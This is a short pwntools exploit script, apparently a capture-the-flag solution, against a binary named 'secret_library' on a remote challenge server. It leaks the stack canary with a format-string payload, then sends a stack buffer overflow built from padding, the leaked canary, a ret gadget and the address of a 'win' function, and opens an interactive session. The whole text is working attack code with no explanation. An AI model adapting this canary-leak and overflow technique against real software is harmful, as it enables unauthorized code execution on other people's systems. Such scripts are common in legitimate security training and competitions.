from pwn import *

context.binary=elf=ELF("./secret_library")

p=process(elf.path)
p=remote("offsec.m0lecon.it",13528)
p.recv()
payload=b"-%27$p-"
offset=128+8
p.sendline(payload)
leak=p.recv().decode().split("-")[1]
print(leak)
ret=ROP(elf).find_gadget(["ret"])[0]
canary=int(leak,16)
payload=flat(
    b'a'*offset,
    p64(canary),
    b'a'*8,
    p64(ret),
    p64(elf.sym.win)
)
p.sendline(payload)


p.interactive()